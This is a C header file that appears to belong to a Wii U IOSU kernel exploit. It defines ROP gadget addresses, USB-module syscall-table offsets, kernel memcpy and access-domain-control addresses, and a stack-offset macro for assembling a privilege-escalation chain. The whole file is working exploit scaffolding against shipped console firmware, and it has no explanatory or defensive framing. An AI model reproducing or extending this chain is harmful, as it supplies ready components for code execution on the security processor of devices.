#ifndef __IOSU_MQ_EXP
#define __IOSU_MQ_EXP

#include "../iosu_payload/arm_user.h"
#include "../iosu_payload/arm_kernel.h"
#include <stddef.h>
#include <stdint.h>
extern "C" int IOSU_Kernel_Exploit();


#define USB_EndTextSection				0x101312D0
#define USB_Memcpy						0x10106D4C // bl usb_memcpy; mov r0, #0; pop {r4, r5, pc};
#define POP_R4_TO_R11_PC				0x101141C8 // pop {r4-r11, pc};
#define POP_R1_R2_R5_PC					0x101063DB // pop {r1, r2, r5, pc};
#define POP_R1_TO_R7_PC					0x101236F3 // pop {r1-r7, pc};
#define POP_R0_R1_R4_PC					0x10123A9F // pop {r0, r1, r4, pc};
#define POP_R4_R5_PC					0x101231A8 // pop {r4, r5, pc};
#define STR_R0_R5_0x1C__POP_R4_R5_PC 	0x101231A4 // str r0,[r5, #0x1c]; pop {r4, r5, pc};
#define MOV_R0_TO_LR__ADD_SP_8__POP_PC	0x1012CFEC // mov lr, r0; add sp, sp, 8; pop {pc};
#define LDR_R0_R0__BX_LR				0x10112E0C // ldr r0, [r0]; bx lr;
#define USB_IOS_SyscallTable			0x1012EABC // .word 0xe7f0XXf0; bx lr;
#define USB_IOS_CreateMessageQueue		USB_IOS_SyscallTable + (8 * 0x0C)
#define USB_IOS_Reset					USB_IOS_SyscallTable + (8 * 0x72)
#define USB_IOS_SendMessage				USB_IOS_SyscallTable + (8 * 0x0E)
#define USB_IOS_JamMessage				USB_IOS_SyscallTable + (8 * 0x0F)
#define USB_IOS_CreateThread			USB_IOS_SyscallTable + (8 * 0x00)
#define USB_IOS_DCFlushRange			USB_IOS_SyscallTable + (8 * 0x52)
#define USB_IOS_Syscall_0x4F			USB_IOS_SyscallTable + (8 * 0x4F)
#define IOS_KernelMemcpy				0x08131D04
#define IOS_SetAccessDomainCtrlReg		0x0812EA10

#define CALC_STACK_OFFSET(dest, src, sp_offset)			(dest - (src + sp_offset + 0x170 + (8 * 0x04)))

#endif

